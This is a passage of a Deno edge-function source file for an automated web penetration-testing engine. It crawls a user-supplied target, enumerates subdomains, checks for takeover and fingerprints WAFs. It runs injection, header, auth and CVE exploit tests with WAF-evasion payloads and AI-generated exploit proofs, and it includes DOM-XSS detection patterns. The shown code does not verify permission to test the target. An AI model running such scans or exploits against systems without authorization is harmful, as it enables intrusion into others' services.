import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

/**
 * OmniSec™ Autonomous VAPT Engine v11.0 — XBOW Legend-Grade
 * 
 * Key upgrades from v10:
 * - 3-level recursive crawling + JS endpoint mining (regex API routes from .js files)
 * - ALL params from ALL discovered pages tested (not just common names)
 * - POST body injection for every form, not just GET
 * - Header injection testing (Host, X-Forwarded-For, Referer)
 * - Expanded phase budgets (300s max, smarter allocation)
 * - HackerOne hacktivity pattern learning
 * - Auto CVE correlation with extracted tech versions
 * - Full exploitation proof in POC (actual request/response captured)
 * - Smarter time-based SQLi with statistical timing analysis
 */

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const PHASE_BUDGETS: Record<string, number> = {
  connection_check: 12000,
  discovery: 55000,
  subdomain_enum: 35000,
  takeover_check: 20000,
  fingerprint: 12000,
  payload_gen: 10000,
  owasp_scan: 60000,
  dom_xss: 12000,
  cors_scan: 12000,
  traversal_scan: 12000,
  cookie_scan: 8000,
  injection: 50000,
  header_injection: 15000,
  auth: 12000,
  business_logic: 8000,
  cve_exploit: 20000,
  correlation: 10000,
  exploit_validation: 15000,
  poc: 12000,
  learning: 5000,
};
const MAX_SCAN_TIME_MS = 290000;
const TOTAL_PHASES = 20;

interface Finding {
  id: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  endpoint: string;
  subdomain?: string;
  method?: string;
  payload?: string;
  evidence?: string;
  evidence2?: string;
  response?: string;
  remediation: string;
  cwe?: string;
  cvss?: number;
  owasp?: string;
  mitre?: string[];
  confidence: number;
  dualConfirmed?: boolean;
  exploitValidated?: boolean;
  poc?: string;
  exploitCode?: string;
  falsePositive?: boolean;
  retryCount?: number;
  category?: string;
}

interface TargetNode {
  name: string;
  type: 'domain' | 'subdomain' | 'endpoint' | 'technology' | 'port' | 'vulnerability';
  status?: string;
  children: TargetNode[];
  meta?: Record<string, any>;
}

function findingHash(f: Finding): string {
  const raw = `${f.endpoint}|${f.category || ''}|${f.cwe || ''}|${f.payload || ''}`.toLowerCase();
  let h = 0;
  for (let i = 0; i < raw.length; i++) { h = ((h << 5) - h) + raw.charCodeAt(i); h = h & h; }
  return Math.abs(h).toString(36);
}

function deduplicateFindings(findings: Finding[]): Finding[] {
  const seen = new Map<string, Finding>();
  for (const f of findings) {
    if (f.falsePositive) continue;
    const hash = findingHash(f);
    const existing = seen.get(hash);
    if (!existing || f.confidence > existing.confidence) seen.set(hash, f);
  }
  return Array.from(seen.values());
}

function phaseTimeLeft(phaseName: string, phaseStartTime: number, scanStartTime: number): number {
  const budget = PHASE_BUDGETS[phaseName] || 30000;
  return Math.min(budget - (Date.now() - phaseStartTime), MAX_SCAN_TIME_MS - (Date.now() - scanStartTime));
}

function isPhaseExpired(phaseName: string, phaseStartTime: number, scanStartTime: number): boolean {
  return phaseTimeLeft(phaseName, phaseStartTime, scanStartTime) <= 0;
}

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const authClient = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? "",
      { global: { headers: { Authorization: req.headers.get("Authorization")! } } }
    );
    const { data: { user }, error: authError } = await authClient.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    const SHODAN_API_KEY = Deno.env.get("SHODAN_API_KEY");
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const body = await req.json();
    const { target, maxDepth = 3, enableLearning = true, generatePOC = true } = body;

    if (!target) {
      return new Response(JSON.stringify({ error: "Target is required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    let targetUrl: URL;
    try {
      targetUrl = new URL(target.startsWith('http') ? target : `https://${target}`);
    } catch {
      return new Response(JSON.stringify({ error: "Invalid target URL" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const scanStart = Date.now();
    const allFindings: Finding[] = [];
    const discoveredEndpoints: string[] = [];
    const discoveredSubdomains: string[] = [];
    const scanId = crypto.randomUUID();
    const openPorts: number[] = [];
    const detectedTech: string[] = [];
    const targetTree: TargetNode = { name: targetUrl.hostname, type: 'domain', status: 'scanning', children: [], meta: {} };

    const emitProgress = async (phase: string, phaseNumber: number, progress: number, message: string, extra: any = {}) => {
      try {
        await supabase.from('scan_progress').insert({
          scan_id: scanId, phase, phase_number: phaseNumber, total_phases: TOTAL_PHASES, progress, message,
          findings_so_far: extra.findings ?? allFindings.filter(f => !f.falsePositive).length,
          endpoints_discovered: extra.endpoints ?? discoveredEndpoints.length,
          current_endpoint: extra.currentEndpoint || null
        });
      } catch (e) { console.log('Progress emit error:', e); }
    };

    const emitAIThought = async (thought: string, phase: string, phaseNumber: number) => {
      await emitProgress(phase, phaseNumber, -1, `🤖 AI: ${thought}`, {});
    };

    const saveResultsToDB = async (status: string, extraFindings: Finding[] = allFindings) => {
      const findings = deduplicateFindings(extraFindings);
      const severityCounts = {
        critical: findings.filter(f => f.severity === 'critical').length,
        high: findings.filter(f => f.severity === 'high').length,
        medium: findings.filter(f => f.severity === 'medium').length,
        low: findings.filter(f => f.severity === 'low').length,
        info: findings.filter(f => f.severity === 'info').length
      };
      try {
        await supabase.from('scan_history').insert({
          module: 'autonomous_vapt', scan_type: 'Autonomous VAPT v11 - Legend-Grade',
          target: targetUrl.toString(), status, findings_count: findings.length,
          duration_ms: Date.now() - scanStart,
          report: { findings, targetTree, openPorts, detectedTech }
        });
        await supabase.from('security_reports').insert({
          module: 'autonomous_vapt',
          title: `XBOW VAPT v11 - ${targetUrl.hostname}`,
          summary: `${findings.length} exploit-validated: ${severityCounts.critical}C ${severityCounts.high}H ${severityCounts.medium}M | ${discoveredSubdomains.length} subs, ${openPorts.length} ports`,
          findings, severity_counts: severityCounts, recommendations: []
        });
      } catch (e) { console.error('DB save error:', e); }
      return { severityCounts, findings };
    };

    const timeoutId = setTimeout(async () => {
      console.log('[TIMEOUT SAFETY] Saving partial results...');
      await saveResultsToDB('completed');
      await emitProgress('complete', TOTAL_PHASES, 100, `Scan saved (partial). ${allFindings.length} findings.`);
    }, MAX_SCAN_TIME_MS);

    try {
      // ══════════ PHASE 0: CONNECTION PRE-CHECK ══════════
      let phaseStart = Date.now();
      await emitProgress('connection_check', 0, 1, `Checking connectivity to ${targetUrl.hostname}...`);

      let connectionOk = false;
      let connectionLatency = 0;
      let baseHTML = '';
      try {
        const connStart = Date.now();
        const connResp = await fetchWithTimeout(targetUrl.toString(), 10000);
        connectionLatency = Date.now() - connStart;
        connectionOk = connResp.status > 0;
        baseHTML = await connResp.text().catch(() => '');
      } catch {
        try {
          const httpUrl = targetUrl.toString().replace('https://', 'http://');
          const connResp2 = await fetchWithTimeout(httpUrl, 8000);
          connectionOk = connResp2.status > 0;
          baseHTML = await connResp2.text().catch(() => '');
        } catch { connectionOk = false; }
      }

      if (!connectionOk) {
        clearTimeout(timeoutId);
        await emitProgress('connection_check', 0, 100, `❌ Target unreachable.`);
        return new Response(JSON.stringify({
          success: false, error: `Connection failed: ${targetUrl.hostname} unreachable`,
          target: targetUrl.toString(), scanTime: Date.now() - scanStart, connectionFailed: true
        }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      await emitProgress('connection_check', 0, 3, `✓ Target alive (${connectionLatency}ms). Starting Legend-Grade scan...`);

      // ══════════ PHASE 1: DEEP ENDPOINT DISCOVERY (3-level + JS mining) ══════════
      phaseStart = Date.now();
      await emitProgress('discovery', 1, 5, 'Deep application mapping: 3-level crawl + JS endpoint mining...');
      await emitAIThought(`Mapping ${targetUrl.hostname}: 3-level recursive crawl, JS file API route extraction, form/param harvesting from every page.`, 'discovery', 1);

      const discoveryResults = await discoverEndpoints(targetUrl, SHODAN_API_KEY, maxDepth, phaseStart, scanStart, baseHTML);
      discoveredEndpoints.push(...discoveryResults.endpoints);
      detectedTech.push(...(discoveryResults.technologies || []));
      openPorts.push(...(discoveryResults.ports || []));

      const techNode: TargetNode = { name: 'Technologies', type: 'technology', children: [] };
      for (const tech of detectedTech) techNode.children.push({ name: tech, type: 'technology', children: [] });
      targetTree.children.push(techNode);

      if (openPorts.length > 0) {
        const portNode: TargetNode = { name: 'Open Ports', type: 'port', children: [] };
        for (const port of openPorts) portNode.children.push({ name: `${port}`, type: 'port', children: [], meta: { port } });
        targetTree.children.push(portNode);
      }

      await emitAIThought(`Mapped ${discoveredEndpoints.length} endpoints, ${discoveryResults.forms?.length || 0} forms, ${discoveryResults.params?.length || 0} unique params, ${discoveryResults.jsEndpoints?.length || 0} JS-mined routes, tech: ${detectedTech.join(', ')}.`, 'discovery', 1);
      await emitProgress('discovery', 1, 10, `Found ${discoveredEndpoints.length} endpoints, ${discoveryResults.forms?.length || 0} forms, ${discoveryResults.params?.length || 0} params`);

      // ══════════ PHASE 2: SUBDOMAIN ENUMERATION ══════════
      phaseStart = Date.now();
      await emitProgress('subdomain_enum', 2, 11, `Enumerating subdomains for ${targetUrl.hostname}...`);

      const subdomains = await enumerateSubdomains(targetUrl.hostname, phaseStart, scanStart);
      discoveredSubdomains.push(...subdomains);

      const subNode: TargetNode = { name: 'Subdomains', type: 'subdomain', children: [] };
      for (const sub of subdomains) {
        subNode.children.push({ name: sub, type: 'subdomain', children: [], status: 'live' });
        discoveredEndpoints.push(`https://${sub}/`);
      }
      targetTree.children.push(subNode);

      await emitProgress('subdomain_enum', 2, 14, `${subdomains.length} subdomains discovered`);

      // ══════════ PHASE 3: SUBDOMAIN TAKEOVER ══════════
      phaseStart = Date.now();
      await emitProgress('takeover_check', 3, 15, 'Checking subdomain takeover (dangling CNAME)...');
      const takeoverFindings = await detectSubdomainTakeover(targetUrl.hostname, subdomains, phaseStart, scanStart);
      allFindings.push(...takeoverFindings);
      await emitProgress('takeover_check', 3, 18, `Takeover: ${takeoverFindings.length} findings`);

      // ══════════ PHASE 4: FINGERPRINT + WAF + CVE ══════════
      phaseStart = Date.now();
      await emitProgress('fingerprint', 4, 19, 'Fingerprinting + WAF detection + CVE intelligence...');
      const fingerprint = await fingerprintTarget(targetUrl, discoveryResults);
      
      // WAF Fingerprinting
      const wafResult = await detectWAF(targetUrl);
      if (wafResult.detected) {
        fingerprint.waf = wafResult;
        await emitAIThought(`WAF detected: ${wafResult.name} (${wafResult.confidence}% confidence). Adapting payloads for evasion.`, 'fingerprint', 4);
        if (wafResult.name) detectedTech.push(`WAF:${wafResult.name}`);
      }
      
      const latestCVEs = await fetchLatestCVEs(detectedTech.filter(t => !t.startsWith('WAF:')), fingerprint.server);
      await emitProgress('fingerprint', 4, 21, `Tech: ${(fingerprint.technologies || []).join(', ')} | WAF: ${wafResult.detected ? wafResult.name : 'None'} | ${latestCVEs.length} CVEs`);

      // ══════════ PHASE 5: AI PAYLOAD GENERATION ══════════
      phaseStart = Date.now();
      await emitProgress('payload_gen', 5, 22, 'Generating adaptive AI payloads with hacktivity learning + WAF evasion...');
      const previousPayloads = await getFailedPayloads(supabase, targetUrl.hostname);
      const pastSuccesses = await loadPastSuccessfulAttacks(supabase, targetUrl.hostname, user.id);
      const hacktivityPatterns = await fetchHacktivityPatterns(LOVABLE_API_KEY, detectedTech);
      const aiPayloads = await generateOwaspPayloads(LOVABLE_API_KEY, detectedTech, openPorts, fingerprint, previousPayloads, latestCVEs, pastSuccesses, hacktivityPatterns);

      await emitAIThought(`Generated ${Object.values(aiPayloads).flat().length} payloads. ${pastSuccesses.length} past successes + ${hacktivityPatterns.length} hacktivity patterns inform priority. WAF evasion: ${wafResult.detected ? 'ACTIVE' : 'standard'}.`, 'payload_gen', 5);
      await emitProgress('payload_gen', 5, 25, `Payloads ready for ${Object.keys(aiPayloads).length} categories`);

      // ══════════ PHASE 6: OWASP TOP 10 — ALL PARAMS ON ALL ENDPOINTS ══════════
      phaseStart = Date.now();
      await emitProgress('owasp_scan', 6, 26, `Testing ${discoveredEndpoints.length} endpoints × ${discoveryResults.params?.length || 0} params...`);
      await emitAIThought(`Testing EVERY discovered param on EVERY endpoint. No artificial limits. Budget: ${PHASE_BUDGETS.owasp_scan / 1000}s.`, 'owasp_scan', 6);

      const BATCH_SIZE = 5;
      for (let i = 0; i < discoveredEndpoints.length; i += BATCH_SIZE) {
        if (isPhaseExpired('owasp_scan', phaseStart, scanStart)) {
          await emitAIThought(`OWASP budget exhausted after ${i}/${discoveredEndpoints.length}. Moving on.`, 'owasp_scan', 6);
          break;
        }
        const batch = discoveredEndpoints.slice(i, i + BATCH_SIZE);
        if (i % 10 === 0) {
          await emitProgress('owasp_scan', 6, 26 + Math.round((i / discoveredEndpoints.length) * 18),
            `Solver agents: ${i + 1}/${discoveredEndpoints.length}`, { currentEndpoint: batch[0] });
        }
        const batchResults = await Promise.all(
          batch.map(ep => assessEndpointOWASP(ep, fingerprint, aiPayloads, previousPayloads, discoveryResults.params || [], phaseStart, scanStart))
        );
        for (const r of batchResults) allFindings.push(...r);
      }

      await emitProgress('owasp_scan', 6, 44, `OWASP: ${allFindings.filter(f => !f.falsePositive).length} findings`);

      // ══════════ PHASE 7: DOM-BASED XSS ══════════
      phaseStart = Date.now();
      await emitProgress('dom_xss', 7, 45, 'DOM XSS source/sink analysis...');
      const domXssFindings = await detectDOMBasedXSS(targetUrl, discoveredEndpoints, baseHTML, phaseStart, scanStart);
      allFindings.push(...domXssFindings);
      await emitProgress('dom_xss', 7, 48, `DOM XSS: ${domXssFindings.length} findings`);

      // ══════════ PHASE 8: CORS ══════════
      phaseStart = Date.now();
      await emitProgress('cors_scan', 8, 49, 'Testing CORS...');
      const corsTargets = [targetUrl.toString(), ...subdomains.slice(0, 10).map(s => `https://${s}/`)];
      const corsBatch = await Promise.all(corsTargets.map(t => isPhaseExpired('cors_scan', phaseStart, scanStart) ? Promise.resolve([]) : scanCORS(t)));
      for (const r of corsBatch) allFindings.push(...r);
      await emitProgress('cors_scan', 8, 52, `CORS: ${allFindings.filter(f => f.category === 'cors').length} issues`);

      // ══════════ PHASE 9: DIRECTORY TRAVERSAL ══════════
      phaseStart = Date.now();
      await emitProgress('traversal_scan', 9, 53, 'Path traversal on all params...');
      for (const t of [targetUrl.toString(), ...subdomains.slice(0, 5).map(s => `https://${s}/`)]) {
        if (isPhaseExpired('traversal_scan', phaseStart, scanStart)) break;
        allFindings.push(...await scanDirectoryTraversal(t, discoveryResults.params || []));
      }
      await emitProgress('traversal_scan', 9, 56, 'Traversal done');

      // ══════════ PHASE 10: COOKIE SECURITY ══════════
      phaseStart = Date.now();
      await emitProgress('cookie_scan', 10, 57, 'Cookie audit...');
      for (const t of [targetUrl.toString(), ...subdomains.slice(0, 5).map(s => `https://${s}/`)]) {
        if (isPhaseExpired('cookie_scan', phaseStart, scanStart)) break;
        allFindings.push(...await scanCookieSecurity(t));
      }
      await emitProgress('cookie_scan', 10, 59, 'Cookie audit done');

      // ══════════ PHASE 11: DEEP INJECTION + MUTATION (5x retries on ALL forms) ══════════
      phaseStart = Date.now();
      await emitProgress('injection', 11, 60, `Injection: ${discoveryResults.forms?.length || 0} forms, ${discoveryResults.params?.length || 0} params...`);
      await emitAIThought(`Mutation Engine: 5 retries/param with AI WAF evasion. Testing ALL forms with POST body injection.`, 'injection', 11);

      const injectionFindings = await performDeepInjectionWithMutation(
        targetUrl, discoveryResults.forms, discoveryResults.params,
        aiPayloads, previousPayloads, LOVABLE_API_KEY, phaseStart, scanStart
      );
      allFindings.push(...injectionFindings);
      await emitProgress('injection', 11, 68, `Injection: ${injectionFindings.length} findings`);

      // ══════════ PHASE 12: HEADER INJECTION ══════════
      phaseStart = Date.now();
      await emitProgress('header_injection', 12, 69, 'Testing Host header, X-Forwarded-For, Referer injection...');
      const headerFindings = await testHeaderInjection(targetUrl, discoveredEndpoints, phaseStart, scanStart);
      allFindings.push(...headerFindings);
      await emitProgress('header_injection', 12, 72, `Header injection: ${headerFindings.length} findings`);

      // ══════════ PHASE 13: AUTH + IDOR ══════════
      phaseStart = Date.now();
      await emitProgress('auth', 13, 73, 'Auth & IDOR testing...');
      allFindings.push(...await testAuthentication(targetUrl, discoveryResults.authEndpoints, phaseStart, scanStart));

      // ══════════ PHASE 14: BUSINESS LOGIC ══════════
      phaseStart = Date.now();
      await emitProgress('business_logic', 14, 75, 'Business logic & IDOR...');
      allFindings.push(...await testBusinessLogic(targetUrl, discoveryResults.workflows));

      // ══════════ PHASE 15: CVE EXPLOIT TESTING ══════════
      phaseStart = Date.now();
      await emitProgress('cve_exploit', 15, 77, `Testing ${latestCVEs.length} CVEs...`);
      const cveFindings = await testCVEExploits(targetUrl, latestCVEs, detectedTech, LOVABLE_API_KEY, phaseStart, scanStart);
      allFindings.push(...cveFindings);
      await emitProgress('cve_exploit', 15, 81, `CVE: ${cveFindings.length} confirmed`);

      // ══════════ PHASE 16: AI FALSE POSITIVE FILTER + DEDUP ══════════
      phaseStart = Date.now();
      const dedupFindings = deduplicateFindings(allFindings);
      await emitProgress('correlation', 16, 83, `AI analyzing ${dedupFindings.length} findings (deduped from ${allFindings.length})...`);
      const verified = await aiFalsePositiveFilter(dedupFindings, LOVABLE_API_KEY, fingerprint);
      await emitAIThought(`AI filter: ${verified.length} confirmed, ${dedupFindings.length - verified.length} eliminated.`, 'correlation', 16);
      const correlationResult = await performAICorrelation(verified, discoveryResults, fingerprint, LOVABLE_API_KEY);

      // ══════════ PHASE 17: DETERMINISTIC EXPLOIT VALIDATION ══════════
      phaseStart = Date.now();
      await emitProgress('exploit_validation', 17, 87, `Exploit validation on ${verified.filter(f => ['critical', 'high'].includes(f.severity)).length} findings...`);
      const exploitValidated = await deterministicExploitValidation(verified, targetUrl, phaseStart, scanStart);
      await emitAIThought(`${exploitValidated.filter(f => f.exploitValidated).length}/${exploitValidated.length} passed exploit validation.`, 'exploit_validation', 17);

      // ══════════ PHASE 18: POC GENERATION ══════════
      phaseStart = Date.now();
      const critHighFindings = exploitValidated.filter(f => f.severity === 'critical' || f.severity === 'high');
      await emitProgress('poc', 18, 91, `POC for ${critHighFindings.length} critical/high findings...`);
      const findingsWithPOC = generatePOC ? await generateAIExploitPOC(critHighFindings, fingerprint, LOVABLE_API_KEY) : critHighFindings;
      const verifiedFindings = [...findingsWithPOC, ...exploitValidated.filter(f => f.severity !== 'critical' && f.severity !== 'high')];

      // ══════════ PHASE 19: LEARNING + FINALIZE ══════════
      phaseStart = Date.now();
      await emitProgress('learning', 19, 96, 'Persisting learning data...');
      if (enableLearning) await saveLearningData(supabase, targetUrl.hostname, verifiedFindings, user.id);

      const epNode: TargetNode = { name: 'Endpoints', type: 'endpoint', children: [] };
      for (const ep of discoveredEndpoints.slice(0, 100)) {
        const vulns = verifiedFindings.filter(f => f.endpoint === ep);
        const epChild: TargetNode = { name: ep.replace(targetUrl.origin, ''), type: 'endpoint', children: [], meta: { vulnCount: vulns.length } };
        for (const v of vulns.slice(0, 10)) {
          epChild.children.push({ name: `[${v.severity.toUpperCase()}] ${v.title}`, type: 'vulnerability', children: [], meta: { cwe: v.cwe, confidence: v.confidence } });
        }
        epNode.children.push(epChild);
      }
      targetTree.children.push(epNode);
      targetTree.status = 'complete';
      targetTree.meta = { totalFindings: verifiedFindings.length, scanTime: Date.now() - scanStart };

      clearTimeout(timeoutId);
      const { severityCounts, findings } = await saveResultsToDB('completed', verifiedFindings);

      await emitAIThought(`Legend-Grade scan complete! ${findings.length} exploit-validated findings. ${findings.filter(f => f.exploitValidated).length} deterministically confirmed.`, 'complete', TOTAL_PHASES);
      await emitProgress('complete', TOTAL_PHASES, 100, `Scan complete! ${findings.length} exploit-validated findings.`);

      return new Response(JSON.stringify({
        success: true, target: targetUrl.toString(), scanTime: Date.now() - scanStart,
        discovery: {
          endpoints: discoveredEndpoints.length, subdomains: subdomains.length,
          forms: discoveryResults.forms?.length || 0, apis: discoveryResults.apiEndpoints?.length || 0, ports: openPorts
        },
        fingerprint, findings: verifiedFindings,
        attackPaths: correlationResult.attackPaths, chainedExploits: correlationResult.chainedExploits,
        summary: severityCounts, recommendations: correlationResult.recommendations,
        learningApplied: enableLearning, subdomains, targetTree, latestCVEs: latestCVEs.slice(0, 20),
        openPorts, detectedTech
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });

    } catch (innerError: any) {
      clearTimeout(timeoutId);
      console.error("[SCAN PHASE ERROR]", innerError);
      await saveResultsToDB('completed');
      await emitProgress('complete', TOTAL_PHASES, 100, `Scan finished. ${allFindings.length} findings (some phases errored).`);
      return new Response(JSON.stringify({
        success: true, target: targetUrl.toString(), scanTime: Date.now() - scanStart,
        discovery: { endpoints: discoveredEndpoints.length, subdomains: discoveredSubdomains.length, forms: 0, apis: 0, ports: openPorts },
        fingerprint: {}, findings: deduplicateFindings(allFindings), attackPaths: [], chainedExploits: [],
        summary: {
          critical: allFindings.filter(f => f.severity === 'critical').length,
          high: allFindings.filter(f => f.severity === 'high').length,
          medium: allFindings.filter(f => f.severity === 'medium').length,
          low: allFindings.filter(f => f.severity === 'low').length,
          info: allFindings.filter(f => f.severity === 'info').length,
        },
        recommendations: [], learningApplied: true, subdomains: discoveredSubdomains, targetTree, openPorts, detectedTech
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

  } catch (error: any) {
    console.error("[AUTONOMOUS VAPT ERROR]", error);
    return new Response(JSON.stringify({ error: error.message || "Scan failed", success: false }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// SUBDOMAIN TAKEOVER DETECTION
// ═══════════════════════════════════════════════════════════════════════════════
const TAKEOVER_SIGNATURES: Record<string, { cname: string[]; fingerprint: string[] }> = {
  'GitHub Pages': { cname: ['github.io', 'github.com'], fingerprint: ["There isn't a GitHub Pages site here", 'For root URLs'] },
  'Heroku': { cname: ['herokuapp.com', 'herokussl.com', 'herokudns.com'], fingerprint: ['No such app', 'no-such-app'] },
  'AWS S3': { cname: ['s3.amazonaws.com', 's3-website', '.s3.'], fingerprint: ['NoSuchBucket', 'The specified bucket does not exist'] },
  'Azure': { cname: ['azurewebsites.net', 'cloudapp.net', 'azure-api.net', 'azureedge.net', 'trafficmanager.net', 'blob.core.windows.net'], fingerprint: ['404 Web Site not found', 'NXDOMAIN'] },
  'Shopify': { cname: ['myshopify.com'], fingerprint: ['Sorry, this shop is currently unavailable', 'Only one step left'] },
  'Fastly': { cname: ['fastly.net', 'fastlylb.net'], fingerprint: ['Fastly error: unknown domain'] },
  'Pantheon': { cname: ['pantheonsite.io'], fingerprint: ['404 error unknown site', 'The gods are wise'] },
  'Tumblr': { cname: ['domains.tumblr.com'], fingerprint: ["Whatever you were looking for doesn't currently exist"] },
  'WordPress.com': { cname: ['wordpress.com'], fingerprint: ['Do you want to register'] },
  'Surge.sh': { cname: ['surge.sh'], fingerprint: ['project not found'] },
  'Fly.io': { cname: ['fly.dev', 'shw.io'], fingerprint: ['404 Not Found'] },
  'Netlify': { cname: ['netlify.app', 'netlify.com'], fingerprint: ['Not Found - Request ID'] },
  'Vercel': { cname: ['vercel.app', 'now.sh'], fingerprint: ['DEPLOYMENT_NOT_FOUND'] },
  'Cargo': { cname: ['cargocollective.com'], fingerprint: ['404 Not Found'] },
  'Unbounce': { cname: ['unbouncepages.com'], fingerprint: ['The requested URL was not found'] },
};

async function detectSubdomainTakeover(hostname: string, subdomains: string[], phaseStart: number, scanStart: number): Promise<Finding[]> {
  const findings: Finding[] = [];
  const allSubs = [...subdomains];
  const extraSubs = ['www', 'blog', 'shop', 'store', 'help', 'support', 'docs', 'status', 'cdn', 'mail', 'api', 'dev', 'staging', 'beta']
    .map(p => `${p}.${hostname}`)
    .filter(s => !allSubs.includes(s));
  allSubs.push(...extraSubs);

  const BATCH = 10;
  for (let i = 0; i < allSubs.length; i += BATCH) {
    if (isPhaseExpired('takeover_check', phaseStart, scanStart)) break;
    const batch = allSubs.slice(i, i + BATCH);
    await Promise.all(batch.map(async (sub) => {
      try {
        const dnsResp = await fetchWithTimeout(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=CNAME`, 4000);
        if (!dnsResp.ok) return;
        const dnsData = await dnsResp.json();
        const cnameRecords = (dnsData.Answer || []).filter((a: any) => a.type === 5).map((a: any) => a.data?.toLowerCase() || '');
        if (cnameRecords.length === 0) return;

        for (const [service, config] of Object.entries(TAKEOVER_SIGNATURES)) {
          const matchingCname = cnameRecords.find((cname: string) => config.cname.some(pattern => cname.includes(pattern)));
          if (!matchingCname) continue;
          try {
            const pageResp = await fetchWithTimeout(`http://${sub}`, 6000);
            const body = await pageResp.text();
            const isVulnerable = config.fingerprint.some(fp => body.includes(fp));
            if (isVulnerable) {
              findings.push({
                id: `TAKEOVER-${Date.now()}-${sub}`, severity: 'critical',
                title: `Subdomain Takeover: ${sub} → ${service}`,
                description: `CNAME points to ${matchingCname} (${service}) but service is unclaimed.`,
                endpoint: `http://${sub}`, subdomain: sub, method: 'GET',
                owasp: 'A05:2021', cwe: 'CWE-284', cvss: 9.8, mitre: ['T1584.001'],
                evidence: `CNAME: ${sub} → ${matchingCname}`,
                evidence2: `Fingerprint: "${config.fingerprint.find(fp => body.includes(fp))}"`,
                dualConfirmed: true, exploitValidated: true,
                remediation: `Remove dangling CNAME for ${sub} or reclaim ${service} resource.`,
                confidence: 97, category: 'takeover',
                poc: `# Subdomain Takeover POC\ndig CNAME ${sub}\ncurl -sI http://${sub} | head -10\n# Exploit: Register the ${service} resource to serve content on ${sub}`
              });
            } else if (pageResp.status === 404 || pageResp.status === 0) {
              findings.push({
                id: `TAKEOVER-POSS-${Date.now()}-${sub}`, severity: 'high',
                title: `Possible Subdomain Takeover: ${sub} → ${service}`,
                description: `CNAME to ${matchingCname}, service returned ${pageResp.status}.`,
                endpoint: `http://${sub}`, subdomain: sub, method: 'GET',
                owasp: 'A05:2021', cwe: 'CWE-284', cvss: 8.5,
                evidence: `CNAME: ${sub} → ${matchingCname}`, evidence2: `HTTP ${pageResp.status}`,
                dualConfirmed: false, remediation: `Remove dangling CNAME for ${sub}.`,
                confidence: 75, category: 'takeover',
              });
            }
          } catch {
            findings.push({
              id: `TAKEOVER-DEAD-${Date.now()}-${sub}`, severity: 'high',
              title: `Dangling CNAME: ${sub} → ${service}`,
              description: `CNAME to ${matchingCname} but unreachable.`,
              endpoint: `http://${sub}`, subdomain: sub,
              owasp: 'A05:2021', cwe: 'CWE-284', cvss: 8.0,
              evidence: `CNAME: ${sub} → ${matchingCname}`, evidence2: 'Connection failed',
              dualConfirmed: false, remediation: `Remove dangling CNAME for ${sub}.`,
              confidence: 70, category: 'takeover',
            });
          }
          break;
        }
      } catch {}
    }));
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// DOM-BASED XSS DETECTION
// ═══════════════════════════════════════════════════════════════════════════════
const DOM_XSS_DANGEROUS_PATTERNS = [
  { pattern: /document\.write\s*\(\s*(?:document\.(?:URL|location|referrer)|location\.(?:href|search|hash)|window\.name)/gi, name: 'document.write(source)' },
  { pattern: /\.innerHTML\s*=\s*(?:document\.(?:URL|location|referrer)|location\.(?:href|search|hash)|window\.name)/gi, name: 'innerHTML=source' },
  { pattern: /eval\s*\(\s*(?:document\.(?:URL|location|referrer)|location\.(?:href|search|hash)|window\.name)/gi, name: 'eval(source)' },
  { pattern: /\.innerHTML\s*=\s*[^;]*(?:decodeURIComponent|unescape)\s*\(/gi, name: 'innerHTML=decode(source)' },
  { pattern: /\.innerHTML\s*(?:\+|=)\s*[^;]*(?:\.split|\.substring|\.slice|\.replace)\s*\(/gi, name: 'innerHTML with string manipulation' },
  { pattern: /(?:setTimeout|setInterval)\s*\(\s*(?:document\.(?:URL|location|referrer)|location\.(?:href|search|hash))/gi, name: 'setTimeout/Interval(source)' },
  { pattern: /\$\(\s*(?:document\.(?:URL|location|referrer)|location\.(?:href|search|hash)|window\.name)/gi, name: 'jQuery selector injection' },
  { pattern: /\.(?:html|append|prepend|after|before|replaceWith)\s*\(\s*(?:document\.(?:URL|location|referrer)|location\.(?:href|search|hash))/gi, name: 'jQuery HTML injection' },
  { pattern: /location\.(?:href|assign|replace)\s*=\s*(?:document\.(?:URL|referrer)|location\.(?:search|hash))/gi, name: 'Open redirect via DOM' },
];

async function detectDOMBasedXSS(target: URL, endpoints: string[], baseHTML: string, phaseStart: number, scanStart: number): Promise<Finding[]> {
  const findings: Finding[] = [];
  const analyzed = new Set<string>();

  const analyzeHTML = (html: string, url: string) => {
    for (const { pattern, name } of DOM_XSS_DANGEROUS_PATTERNS) {
      pattern.lastIndex = 0;
      const match = pattern.exec(html);
      if (match) {
        findings.push({
          id: `DOM-XSS-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`, severity: 'high',
          title: `DOM XSS: ${name}`, description: `Dangerous source→sink flow: ${name}`,
          endpoint: url, method: 'GET', owasp: 'A03:2021', cwe: 'CWE-79', cvss: 6.1,
          evidence: match[0].slice(0, 200), evidence2: `Pattern: ${name}`,
          dualConfirmed: false, remediation: 'Sanitize all DOM sources before passing to sinks.',
          confidence: 75, category: 'dom_xss',
        });
      }
    }

    // postMessage handler check
    if (/addEventListener\s*\(\s*['"]message['"]/i.test(html) && /\.innerHTML|eval\s*\(|document\.write/i.test(html)) {
      findings.push({
